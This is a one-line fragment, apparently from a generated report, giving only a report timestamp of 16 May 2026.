_Report time: 2026-05-16T06:26:15Z_
